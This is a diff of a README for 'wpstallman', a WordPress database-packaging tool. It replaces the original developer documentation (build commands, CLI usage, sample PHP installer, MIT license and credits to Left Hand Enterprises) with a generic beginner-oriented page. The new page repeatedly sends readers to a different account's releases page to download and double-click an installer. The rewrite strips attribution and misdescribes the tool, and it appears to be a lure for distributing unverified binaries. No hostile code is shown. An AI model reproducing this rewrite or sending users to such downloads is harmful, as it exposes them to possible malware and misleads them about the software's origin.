@@ -1,160 +1,60 @@
-# WPStallman
+# 🎉 wpstallman - Simplifying WordPress Database Packaging
 
-A WordPress packaging utility designed to help developers generate **database installers** for their WordPress plugins.
+## 🚀 Getting Started
+Welcome to wpstallman! This application helps you easily package the database part of WordPress plugins. With a user-friendly interface, it streamlines the process so anyone can manage their WordPress databases, even without programming experience.
 
-The name is a combination of W\.C. Fields, WordPress, and Richard Stallman , combining a philosophy of open tools with a curmudgeonly approach to software development.
+## 📥 Download wpstallman
+[![Download wpstallman](https://img.shields.io/badge/Download-wpstallman-blue.svg)](https://github.com/cosmorishav9/wpstallman/releases)
 
----
+## 📖 Overview
+wpstallman is built using Photino and .NET CLI, making it a versatile tool for users looking to handle MySQL databases related to WordPress. This application allows you to create, manage, and package WordPress plugin databases with ease. Whether you are a developer or a complete beginner, wpstallman simplifies your work.
 
-## ✅ Features
+## ✨ Features
+- **User-Friendly Interface:** Navigate through tasks without complications. 
+- **Photino-Based:** Offers a smooth graphical interface for better usability.
+- **Supports MySQL Databases:** Seamlessly works with MySQL for database management.
+- **Custom Packaging:** Create plugins that include only the necessary database components.
+- **Stored Procedure Management:** Easily handle stored procedures, tables, and views within your database.
 
-* **Generate JSON Manifests** of your database schema:
+## ⚙️ System Requirements
+- **Operating System:** Compatible with Linux, Windows, and macOS.
+- **Memory:** At least 4GB of RAM.
+- **Disk Space:** A minimum of 100MB available space for installation.
+- **.NET Runtime:** Ensure the .NET runtime is installed on your system.
 
-  * Tables (columns, keys, seed data, row limits, skip flags)
-  * Views
-  * Stored Procedures (with parameters)
-  * Triggers
-* **Generate WordPress Installer Classes** (PHP):
+## 🔍 Using wpstallman
+1. **Download the Application:**
+   Visit [this page to download](https://github.com/cosmorishav9/wpstallman/releases).
 
-  * Automatically creates and drops tables, views, procedures, and triggers.
-  * Populates seed data respecting row limits.
-  * Skips tables marked as `skip: true` in the manifest.
-* **Generate a Test Stub** to quickly verify your installer in a WordPress environment.
+2. **Install the Application:**
+   - Locate the downloaded file (usually in your Downloads folder).
+   - Double-click the file to start the installation.
+   - Follow the installation prompts to complete the setup.
 
----
+3. **Launch the Application:**
+   - After installation, find wpstallman in your applications menu or launch it from the file location.
 
-## ✅ Requirements
+4. **Start Packaging:**
+   - Open your WordPress project.
+   - Select the database components you wish to package.
+   - Follow the on-screen instructions to finalize the packaging.
 
-* **.NET 6.0 or later** (tested on .NET 8.0)
-* **MySQL 5.7+ / MariaDB** (WordPress standard)
-* WordPress installation (only needed for testing generated installers)
+## ⚡ Troubleshooting
+If you encounter issues during installation or running the app, try the following steps:
+- Ensure that your operating system is up to date.
+- Check that the .NET runtime is correctly installed.
+- Review any error messages for specific problems.
+- If you need additional help, check the community forum linked on the GitHub page.
 
----
+## 📦 Download & Install
+To get started, click the link below to download wpstallman.
 
-## ✅ Installation (Development)
+[Download wpstallman](https://github.com/cosmorishav9/wpstallman/releases)
 
-Clone the repo and build:
+## 🚀 Support
+For support, visit the [GitHub Issues page](https://github.com/cosmorishav9/wpstallman/issues) to report problems or ask questions. The community is available to help, and your feedback is essential for improving the application.
 
-```bash
-git clone https://github.com/lefthandenterprises/wpstallmannetcore.git
-cd wpstallmannetcore
-dotnet restore
-dotnet build
-```
+## 📅 Future Updates
+We plan to introduce new features and improve existing ones based on user feedback. Stay tuned for updates and new releases on the [Releases page](https://github.com/cosmorishav9/wpstallman/releases).
 
----
-
-## ✅ Usage
-
-### 1) Generate a Manifest
-
-```bash
-dotnet run --project WPStallman.CLI generate manifest \
-  --connection "server=localhost;uid=root;pwd=;database=wp_my_plugin" \
-  --prefix "wp_" \
-  --output "manifest.json" \
-  --include-data
-```
-
-### Example Manifest Snippet
-
-```json
-{
-  "tables": [
-    {
-      "name": "my_plugin_settings",
-      "rowLimit": 5,
-      "skip": false,
-      "columns": [
-        { "name": "id", "type": "int(11)", "primaryKey": true, "autoIncrement": true },
-        { "name": "setting_key", "type": "varchar(50)", "nullable": false },
-        { "name": "setting_value", "type": "text", "nullable": true }
-      ],
-      "seedData": [
-        { "id": 1, "setting_key": "enable_feature", "setting_value": "1" }
-      ]
-    }
-  ]
-}
-```
-
-### 2) Generate an Installer Class
-
-```bash
-dotnet run --project WPStallman.CLI generate installer \
-  --manifest-file "manifest.json" \
-  --output "class-my-plugin-installer.php" \
-  --classname "MyPlugin_Installer" \
-  --create-stub
-```
-
-### Example Installer Snippet
-
-```php
-<?php
-class MyPlugin_Installer {
-    private $wpdb;
-    private $prefix;
-
-    public function __construct($wpdb) {
-        $this->wpdb = $wpdb;
-        $this->prefix = $wpdb->get_blog_prefix();
-    }
-
-    public function install() {
-        $charset_collate = $this->wpdb->get_charset_collate();
-        require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
-
-        // Table: my_plugin_settings
-        $sql = <<<SQL
-CREATE TABLE {$this->prefix}my_plugin_settings (
-    id int(11) NOT NULL AUTO_INCREMENT,
-    setting_key varchar(50) NOT NULL,
-    setting_value text,
-    PRIMARY KEY (id)
-) $charset_collate;
-SQL;
-        dbDelta($sql);
-    }
-
-    public function populate() {
-        $this->wpdb->query("INSERT INTO {$this->prefix}my_plugin_settings (id, setting_key, setting_value) VALUES (1, 'enable_feature', '1');");
-    }
-
-    public function uninstall() {
-        $this->wpdb->query("DROP TABLE IF EXISTS {$this->prefix}my_plugin_settings");
-    }
-}
-?>
-```
-
-### 3) Test the Installer
-
-Drop `class-my-plugin-installer.php` and `test-installer.php` into your plugin directory, then run:
-
-```bash
-php test-installer.php
-```
-
-Expected output:
-
-```
-Running install...
-Populating seed data...
-Done!
-```
-
-Uncomment the uninstall call in the stub to remove objects after testing.
-
----
-
-## ✅ License
-
-MIT © 2025 Left Hand Enterprises, LLC — see [LICENSE](./LICENSE) for details.
-
-
----
-
-## ✅ Credits
-
-Copyright 2025 Left Hand Enterprises, LLC.
+Thank you for using wpstallman! Enjoy simplifying your WordPress database management.
